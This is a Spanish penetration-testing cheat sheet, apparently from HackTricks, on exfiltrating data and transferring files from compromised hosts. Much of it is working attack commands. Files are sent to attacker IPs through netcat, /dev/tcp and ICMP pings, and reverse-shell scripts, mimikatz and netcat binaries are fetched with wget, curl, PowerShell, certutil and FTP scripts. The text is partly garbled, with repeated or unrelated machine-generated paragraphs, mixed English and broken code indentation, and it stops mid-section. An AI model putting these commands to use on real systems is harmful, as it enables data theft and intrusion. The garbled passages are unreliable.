# Exfiltración

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu infraestructura tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Dominios comúnmente permitidos para exfiltrar información

Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente permitidos que pueden ser abusados.

## Copiar y pegar en Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Exfiltración de datos es el proceso de robo o filtración de información confidencial desde un sistema comprometido. En el contexto de Windows, hay varias técnicas comunes que los hackers utilizan para exfiltrar datos de manera encubierta. A continuación se presentan algunas de estas técnicas:

1. **Túneles encubiertos**: Los hackers pueden utilizar túneles encubiertos para enviar datos fuera de un sistema comprometido sin ser detectados. Esto implica el uso de protocolos de red como ICMP, DNS o HTTP para ocultar los datos dentro del tráfico normal de la red.

2. **Protocolos de red alternativos**: Además de los protocolos de red estándar, los hackers pueden utilizar protocolos menos comunes o personalizados para exfiltrar datos. Esto dificulta la detección, ya que los sistemas de seguridad pueden no estar configurados para monitorear estos protocolos.

3. **Esteganografía**: La esteganografía es el arte de ocultar información dentro de archivos aparentemente inocentes, como imágenes o documentos. Los hackers pueden utilizar técnicas de esteganografía para ocultar datos confidenciales y luego extraerlos en un sistema externo.

4. **Uso de servicios en la nube**: Los hackers pueden aprovechar servicios en la nube como almacenamiento o correo electrónico para exfiltrar datos. Esto les permite almacenar y transferir información de manera encubierta, utilizando la infraestructura de la nube como intermediario.

5. **Canal lateral**: Los hackers pueden utilizar canales laterales para exfiltrar datos a través de medios no convencionales, como el uso de señales electromagnéticas o acústicas. Estos canales no son monitoreados por los sistemas de seguridad tradicionales, lo que los hace difíciles de detectar.

Es importante tener en cuenta que estas técnicas son solo algunas de las muchas formas en que los hackers pueden exfiltrar datos en un entorno de Windows. Los profesionales de la seguridad deben estar al tanto de estas técnicas y tomar medidas para proteger sus sistemas contra ellas.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### Introducción

El protocolo HTTP (Hypertext Transfer Protocol) es un protocolo de comunicación utilizado para transferir información en la web. Es ampliamente utilizado para la comunicación entre clientes y servidores en Internet.

### Métodos HTTP

Los métodos HTTP son acciones que se pueden realizar en un recurso identificado por una URL. Los métodos más comunes son:

- GET: solicita la representación de un recurso.
- POST: envía datos al servidor para ser procesados.
- PUT: actualiza un recurso existente.
- DELETE: elimina un recurso.

### Cabeceras HTTP

Las cabeceras HTTP son campos de metadatos que se envían junto con una solicitud o respuesta HTTP. Proporcionan información adicional sobre la solicitud o respuesta. Algunas cabeceras comunes son:

- User-Agent: identifica el software del cliente que realiza la solicitud.
- Content-Type: especifica el tipo de contenido que se envía o se espera recibir.
- Authorization: proporciona credenciales para autenticar la solicitud.

### Códigos de estado HTTP

Los códigos de estado HTTP son números que indican el estado de una solicitud HTTP. Algunos códigos de estado comunes son:

- 200 OK: la solicitud se ha completado con éxito.
- 404 Not Found: el recurso solicitado no se ha encontrado.
- 500 Internal Server Error: se produjo un error en el servidor.

### Ejemplo de solicitud HTTP

A continuación se muestra un ejemplo de una solicitud HTTP utilizando el método GET:

```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```

En este ejemplo, se solicita el recurso "index.html" del servidor "www.example.com" utilizando el método GET. La solicitud incluye la cabecera "User-Agent" que identifica el navegador utilizado.

### Ejemplo de respuesta HTTP

A continuación se muestra un ejemplo de una respuesta HTTP:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1274

<!DOCTYPE html>
<html>
<head>
<title>Ejemplo</title>
</head>
<body>
<h1>Hola, mundo!</h1>
</body>
</html>
```

En este ejemplo, el servidor responde con un código de estado "200 OK" indicando que la solicitud se ha completado con éxito. La respuesta incluye la cabecera "Content-Type" que especifica que el contenido es de tipo "text/html" y la cabecera "Content-Length" que indica la longitud del contenido en bytes. El cuerpo de la respuesta contiene el código HTML que se mostrará en el navegador.
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Exfiltración de datos es el proceso de robo o filtración de información confidencial desde un sistema comprometido. En el contexto de Windows, hay varias técnicas comunes que los hackers utilizan para exfiltrar datos de manera encubierta. A continuación se presentan algunas de estas técnicas:

1. **Túneles encubiertos**: Los hackers pueden utilizar túneles encubiertos para enviar datos fuera de un sistema comprometido sin ser detectados. Esto implica el uso de protocolos de red como ICMP, DNS o HTTP para ocultar los datos dentro del tráfico normal de la red.

2. **Protocolos de red alternativos**: Además de los protocolos de red estándar, los hackers pueden utilizar protocolos menos comunes o personalizados para exfiltrar datos. Esto dificulta la detección, ya que los sistemas de seguridad pueden no estar configurados para monitorear estos protocolos.

3. **Esteganografía**: La esteganografía es el arte de ocultar información dentro de archivos aparentemente inocentes, como imágenes o documentos. Los hackers pueden utilizar técnicas de esteganografía para ocultar datos confidenciales y luego extraerlos en un sistema externo.

4. **Uso de servicios en la nube**: Los hackers pueden aprovechar servicios en la nube como almacenamiento o correo electrónico para exfiltrar datos. Esto implica cargar los datos en una cuenta de almacenamiento en la nube o enviarlos a través de servicios de correo electrónico encriptados.

5. **Canal lateral**: Los hackers pueden utilizar canales laterales para exfiltrar datos a través de medios no convencionales, como el uso de señales acústicas o electromagnéticas. Esto puede ser especialmente útil en entornos altamente seguros donde las comunicaciones normales están restringidas.

Es importante tener en cuenta que estas técnicas son solo algunas de las muchas formas en que los hackers pueden exfiltrar datos en sistemas Windows. Los profesionales de la seguridad deben estar al tanto de estas técnicas y tomar medidas para proteger sus sistemas contra ellas.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Subir archivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimiendo GET y POST (también encabezados)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo de Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

An HTTPS server is a secure server that uses the HTTPS protocol to encrypt the communication between the server and the client. This ensures that the data transmitted between the two parties is protected from eavesdropping and tampering.

To exfiltrate data from an HTTPS server, there are several methods that can be used:

1. **Data Leakage through HTTPS Requests**: In this method, an attacker can exploit vulnerabilities in the server or the application running on it to leak sensitive data through HTTPS requests. This can be done by manipulating the request parameters or exploiting insecure configurations.

2. **Man-in-the-Middle (MitM) Attack**: In a MitM attack, the attacker intercepts the communication between the client and the server, allowing them to view and modify the data being transmitted. By performing a MitM attack on an HTTPS connection, an attacker can exfiltrate data by capturing and decrypting the encrypted traffic.

3. **SSL/TLS Vulnerabilities**: SSL/TLS vulnerabilities can be exploited to exfiltrate data from an HTTPS server. These vulnerabilities can include weak encryption algorithms, insecure certificate configurations, or implementation flaws. By exploiting these vulnerabilities, an attacker can gain access to the encrypted data and exfiltrate it.

4. **Server Misconfigurations**: Misconfigurations in the server's SSL/TLS settings can also lead to data exfiltration. These misconfigurations can include weak cipher suites, outdated SSL/TLS versions, or insecure certificate authorities. By exploiting these misconfigurations, an attacker can bypass the server's security measures and exfiltrate data.

It is important for organizations to regularly update and patch their servers, as well as follow best practices for SSL/TLS configuration, to mitigate the risk of data exfiltration through HTTPS servers.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

#### Introduction

In this section, we will discuss the exfiltration technique using an FTP server implemented in NodeJS. FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and a server on a computer network.

#### Setting up the FTP server

To set up the FTP server, we need to install the `ftp-srv` package using the following command:

```bash
npm install ftp-srv
```

#### Creating the FTP server

To create the FTP server, we need to create a new JavaScript file, for example `ftp-server.js`, and add the following code:

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  pasv_min: 3001,
  pasv_max: 3009,
});

ftpServer.on('login', ({ connection, username, password }, resolve, reject) => {
  if (username === 'admin' && password === 'password') {
    resolve({ root: '/path/to/ftp/files' });
  } else {
    reject(new Error('Invalid username or password'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((error) => {
    console.error('Error starting FTP server:', error);
  });
```

#### Starting the FTP server

To start the FTP server, run the following command:

```bash
node ftp-server.js
```

#### Connecting to the FTP server

To connect to the FTP server, you can use any FTP client software, such as FileZilla or WinSCP. Use the following connection details:

- Host: `localhost`
- Port: `21`
- Username: `admin`
- Password: `password`

#### Exfiltrating files

Once connected to the FTP server, you can exfiltrate files by uploading them to the server. You can use the FTP client software to navigate to the desired directory and upload files from your local machine to the server.

#### Conclusion

In this section, we discussed the exfiltration technique using an FTP server implemented in NodeJS. FTP servers provide a convenient way to transfer files between a client and a server. By setting up and using an FTP server, you can easily exfiltrate files during a penetration testing engagement.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)

#### Introduction

FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and a server on a computer network. It is commonly used for website maintenance, software updates, and file sharing.

#### Exfiltration Methodology

1. **Identify the FTP server**: Determine if the target system is running an FTP server. Use tools like Nmap or manual enumeration techniques to identify open FTP ports (usually port 21).

2. **Enumerate FTP server**: Gather information about the FTP server, such as the version and configuration. This information can be useful for identifying potential vulnerabilities or misconfigurations.

3. **Brute force FTP credentials**: If the FTP server allows anonymous access, try logging in with default or common credentials. If anonymous access is not allowed, use brute force techniques to guess valid usernames and passwords.

4. **Exploit FTP vulnerabilities**: Research and exploit known vulnerabilities in the FTP server software. Common vulnerabilities include buffer overflows, command injection, and weak encryption.

5. **Upload malicious files**: Once authenticated, upload malicious files to the FTP server. These files can be used to establish a backdoor, execute remote commands, or exfiltrate sensitive data.

6. **Exfiltrate data**: Use the FTP server as a means to exfiltrate data from the target system. This can be done by uploading sensitive files to the server and then downloading them to an attacker-controlled system.

#### Countermeasures

To protect against FTP server exfiltration, consider implementing the following countermeasures:

- Regularly update and patch the FTP server software to mitigate known vulnerabilities.
- Enforce strong passwords and implement account lockout policies to prevent brute force attacks.
- Disable anonymous access to the FTP server.
- Implement intrusion detection and prevention systems to detect and block suspicious FTP activities.
- Monitor FTP server logs for any unauthorized access or suspicious file uploads.
- Use secure file transfer protocols like SFTP (SSH File Transfer Protocol) or FTPS (FTP over SSL/TLS) instead of plain FTP.

By following these countermeasures, you can significantly reduce the risk of data exfiltration through FTP servers.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Cliente de Windows**

El cliente de Windows es un sistema operativo ampliamente utilizado en computadoras personales y en entornos empresariales. A continuación se presentan algunas metodologías y recursos generales para la exfiltración de datos en un entorno de Windows.

#### **Métodos de exfiltración**

1. **Correo electrónico**: El correo electrónico es una forma común de exfiltrar datos. Los atacantes pueden enviar archivos adjuntos o utilizar técnicas de esteganografía para ocultar información dentro de los mensajes de correo electrónico.

2. **Transferencia de archivos**: Los atacantes pueden utilizar protocolos como FTP, SMB o HTTP para transferir archivos desde el sistema comprometido a un servidor controlado por ellos.

3. **Túneles encubiertos**: Los atacantes pueden utilizar técnicas de túneles encubiertos para ocultar el tráfico de datos dentro de protocolos legítimos, como DNS o ICMP.

4. **Dispositivos de almacenamiento extraíbles**: Los atacantes pueden utilizar dispositivos de almacenamiento extraíbles, como unidades USB, para copiar y transportar datos fuera del sistema comprometido.

#### **Recursos útiles**

1. **Herramientas de exfiltración**: Hay varias herramientas disponibles para facilitar la exfiltración de datos en un entorno de Windows, como PowerSploit, Metasploit y Cobalt Strike.

2. **Técnicas de ocultamiento**: Los atacantes pueden utilizar técnicas de ocultamiento para evitar la detección durante la exfiltración de datos. Algunas técnicas comunes incluyen el cifrado de archivos, la compresión de datos y el uso de nombres de archivo no sospechosos.

3. **Análisis de tráfico de red**: El análisis del tráfico de red puede ayudar a identificar patrones y anomalías que indiquen una posible exfiltración de datos. Herramientas como Wireshark y tcpdump son útiles para este propósito.

4. **Monitoreo de eventos**: El monitoreo de eventos en el sistema operativo Windows puede ayudar a detectar actividades sospechosas, como la creación de archivos o la transferencia de datos. Herramientas como Sysmon y Windows Event Viewer son útiles para este propósito.

Recuerda que la exfiltración de datos sin autorización es ilegal y solo debe realizarse como parte de un proceso de prueba de penetración autorizado.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que más importan para que puedas solucionarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnológica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali como servidor
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
O crea un recurso compartido smb **utilizando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltración de datos en Windows

La exfiltración de datos es un proceso crucial en las pruebas de penetración, ya que implica la extracción de información sensible de un sistema comprometido. En entornos de Windows, existen varias técnicas que se pueden utilizar para llevar a cabo esta tarea.

## Técnicas de exfiltración de datos en Windows

### 1. Uso de herramientas de línea de comandos

Las herramientas de línea de comandos integradas en Windows, como `netcat` y `curl`, pueden ser utilizadas para transferir datos a través de la red. Estas herramientas permiten establecer conexiones TCP o enviar solicitudes HTTP para enviar información a un servidor remoto.

### 2. Uso de protocolos de red

Los protocolos de red como FTP, SMB y DNS pueden ser utilizados para exfiltrar datos en Windows. Por ejemplo, se puede utilizar el protocolo FTP para cargar archivos en un servidor remoto o el protocolo SMB para copiar archivos en una ubicación compartida.

### 3. Uso de servicios en la nube

Los servicios en la nube, como Dropbox o Google Drive, pueden ser utilizados para exfiltrar datos en Windows. Estos servicios permiten cargar archivos en la nube y compartirlos con otros usuarios o descargarlos en otro dispositivo.

### 4. Uso de técnicas de esteganografía

La esteganografía es el arte de ocultar información dentro de otros archivos o medios. En Windows, se pueden utilizar técnicas de esteganografía para ocultar datos dentro de imágenes, archivos de audio o documentos de texto, lo que permite su exfiltración sin levantar sospechas.

## Recursos adicionales

- [Herramientas de línea de comandos en Windows](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
- [Protocolo FTP](https://tools.ietf.org/html/rfc959)
- [Protocolo SMB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/0e60e5f4-5a3a-4d88-8b58-3b6a8e6e4c7e)
- [Servicios en la nube](https://www.dropbox.com/)
- [Técnicas de esteganografía](https://en.wikipedia.org/wiki/Steganography)
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

El atacante debe tener SSHd en ejecución.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) es una herramienta de red versátil que se utiliza comúnmente en pruebas de penetración y hacking. Puede ser utilizada para la exfiltración de datos, que es el proceso de robar y transferir información confidencial desde un sistema comprometido a un atacante.

Hay varias formas en las que NC puede ser utilizado para la exfiltración de datos:

1. **Exfiltración de archivos**: NC puede ser utilizado para transferir archivos desde un sistema comprometido a un servidor controlado por el atacante. Esto se logra utilizando el comando `nc -w 3 <IP del atacante> <puerto> < archivo` en el sistema comprometido y `nc -l -p <puerto> > archivo` en el servidor del atacante.

2. **Exfiltración de datos en tiempo real**: NC también puede ser utilizado para transferir datos en tiempo real desde un sistema comprometido a un atacante. Esto se logra utilizando el comando `nc -w 3 <IP del atacante> <puerto>` en el sistema comprometido y `nc -l -p <puerto>` en el servidor del atacante. Una vez establecida la conexión, los datos pueden ser enviados y recibidos en tiempo real.

3. **Exfiltración de datos a través de canales encubiertos**: NC puede ser utilizado para establecer canales encubiertos a través de los cuales los datos pueden ser exfiltrados sin ser detectados. Esto se logra utilizando técnicas como la esteganografía, donde los datos se ocultan dentro de archivos aparentemente inocentes, como imágenes o documentos.

Es importante tener en cuenta que la exfiltración de datos es una actividad ilegal y éticamente cuestionable. Este conocimiento se proporciona con fines educativos y para aumentar la conciencia sobre las técnicas utilizadas por los atacantes. Se recomienda encarecidamente utilizar estas técnicas solo con fines legales y con el consentimiento explícito del propietario del sistema.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim's machine and `<port>` with the port number you want to use for the connection. `<local_file>` should be replaced with the name of the file you want to save the downloaded content to.

For example, if the victim's IP address is `192.168.1.100`, the port is `8080`, and you want to save the downloaded content to a file named `secret.txt`, the command would be:

```bash
cat < /dev/tcp/192.168.1.100/8080 > secret.txt
```

This command will establish a connection to the victim's machine on the specified port and redirect the content to the specified local file.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Subir archivo al objetivo

Una vez que hemos obtenido acceso al sistema objetivo, podemos proceder a exfiltrar datos sensibles mediante la carga de archivos. Este método nos permite transferir archivos desde el sistema objetivo a un servidor controlado por nosotros.

#### Pasos a seguir:

1. **Preparar el servidor de carga**: Configuramos un servidor en nuestra máquina o en una infraestructura en la nube para recibir los archivos que serán exfiltrados.

2. **Crear un archivo malicioso**: Creamos un archivo malicioso en el sistema objetivo que contenga los datos que deseamos exfiltrar. Este archivo puede ser cualquier tipo de archivo, como un documento, una imagen o un archivo comprimido.

3. **Inyectar código malicioso**: Modificamos el archivo malicioso para que, al abrirlo, se ejecute código malicioso que se encargará de enviar el archivo al servidor de carga. Esto se puede lograr mediante la inserción de código en el archivo o mediante la explotación de vulnerabilidades en las aplicaciones que abren el tipo de archivo en cuestión.

4. **Transferir el archivo**: Una vez que el archivo malicioso ha sido creado y modificado, lo transferimos al sistema objetivo. Esto se puede hacer a través de técnicas como la ingeniería social, la explotación de vulnerabilidades en el sistema objetivo o el uso de técnicas de phishing.

5. **Ejecutar el archivo malicioso**: Una vez que el archivo malicioso ha sido transferido al sistema objetivo, lo ejecutamos. Esto activará el código malicioso que se encargará de enviar el archivo al servidor de carga.

6. **Recibir el archivo**: En el servidor de carga, recibimos el archivo exfiltrado y lo almacenamos para su posterior análisis.

Es importante tener en cuenta que este método de exfiltración de archivos puede ser detectado por soluciones de seguridad, por lo que es recomendable utilizar técnicas de evasión y ocultamiento para evitar ser detectados.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Gracias a **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si puedes enviar datos a un servidor SMTP, puedes crear un SMTP para recibir los datos con python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por defecto en XP y 2003 (en otros sistemas operativos es necesario agregarlo explícitamente durante la instalación)

En Kali, **iniciar el servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP en python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Bind the socket to a specific address and port
    server_address = ('', 69)
    sock.bind(server_address)
    
    while True:
        print('Waiting to receive data...')
        data, address = sock.recvfrom(516)
        
        opcode = struct.unpack('!H', data[:2])[0]
        
        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
            
            print(f'Read request received from {address[0]}:{address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')
            
            # Send the file
            send_file(sock, address, filename)
            
        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
            
            print(f'Write request received from {address[0]}:{address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')
            
            # Receive the file
            receive_file(sock, address, filename)
            
        else:
            # Invalid opcode
            print(f'Invalid opcode {opcode} received from {address[0]}:{address[1]}')
            
def send_file(sock, address, filename):
    # Open the file in binary mode
    try:
        file = open(filename, 'rb')
    except FileNotFoundError:
        # File not found
        error_packet = struct.pack('!HH', 5, 1) + b'File not found'
        sock.sendto(error_packet, address)
        return
    
    block_number = 1
    data = file.read(512)
    
    while data:
        # Create the data packet
        data_packet = struct.pack('!HH', 3, block_number) + data
        
        # Send the data packet
        sock.sendto(data_packet, address)
        
        # Wait for the acknowledgment
        ack_packet, address = sock.recvfrom(4)
        ack_block_number = struct.unpack('!H', ack_packet[2:4])[0]
        
        if ack_block_number == block_number:
            # Acknowledgment received, move to the next block
            block_number += 1
            data = file.read(512)
        else:
            # Invalid acknowledgment
            print(f'Invalid acknowledgment {ack_block_number} received from {address[0]}:{address[1]}')
            break
    
    # Close the file
    file.close()
    
def receive_file(sock, address, filename):
    # Create the file in binary mode
    file = open(filename, 'wb')
    
    block_number = 0
    
    while True:
        # Create the acknowledgment packet
        ack_packet = struct.pack('!HH', 4, block_number)
        
        # Send the acknowledgment packet
        sock.sendto(ack_packet, address)
        
        # Wait for the data packet
        data_packet, address = sock.recvfrom(516)
        opcode = struct.unpack('!H', data_packet[:2])[0]
        
        if opcode == 3:
            # Data packet received
            received_block_number = struct.unpack('!H', data_packet[2:4])[0]
            
            if received_block_number == block_number + 1:
                # Correct block number, write the data to the file
                file.write(data_packet[4:])
                block_number += 1
                
                # Create the acknowledgment packet
                ack_packet = struct.pack('!HH', 4, block_number)
                
                # Send the acknowledgment packet
                sock.sendto(ack_packet, address)
                
                if len(data_packet) < 516:
                    # Last data packet received, end the loop
                    break
            else:
                # Invalid block number
                print(f'Invalid block number {received_block_number} received from {address[0]}:{address[1]}')
                break
        else:
            # Invalid opcode
            print(f'Invalid opcode {opcode} received from {address[0]}:{address[1]}')
            break
    
    # Close the file
    file.close()

if __name__ == '__main__':
    tftp_server()
```

Este código implementa un servidor TFTP (Trivial File Transfer Protocol) en Python. El servidor utiliza un socket UDP para recibir solicitudes de lectura y escritura de archivos. Cuando se recibe una solicitud de lectura, el servidor envía el archivo solicitado al cliente. Cuando se recibe una solicitud de escritura, el servidor recibe el archivo del cliente y lo guarda en el sistema de archivos del servidor.

Para utilizar el servidor TFTP, simplemente ejecute el script en un entorno de Python. El servidor escuchará en el puerto 69 y estará listo para recibir solicitudes de transferencia de archivos.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
En **víctima**, conectarse al servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Descargar un archivo con una línea de código en PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) es un lenguaje de scripting basado en Visual Basic que se utiliza comúnmente para automatizar tareas en sistemas Windows. Aunque VBScript no es tan popular como otros lenguajes de scripting, todavía se utiliza en algunos entornos y puede ser útil para ciertas tareas de hacking.

### Exfiltración de datos con VBScript

La exfiltración de datos es el proceso de robo o transferencia de datos confidenciales desde un sistema comprometido hacia un atacante. En el contexto de VBScript, la exfiltración de datos puede lograrse utilizando diferentes técnicas, como:

